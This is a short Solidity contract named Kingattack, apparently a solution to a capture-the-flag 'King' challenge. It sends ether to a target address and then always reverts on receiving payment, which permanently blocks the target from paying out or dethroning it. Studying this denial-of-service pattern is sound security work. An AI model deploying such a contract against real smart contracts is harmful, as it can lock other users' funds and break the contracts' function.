pragma solidity ^0.8.0;

contract Kingattack{
    constructor(address _add) public payable{

        _add.call{value : msg.value}("");
    }
    
    receive() external payable{
        revert();
    }
}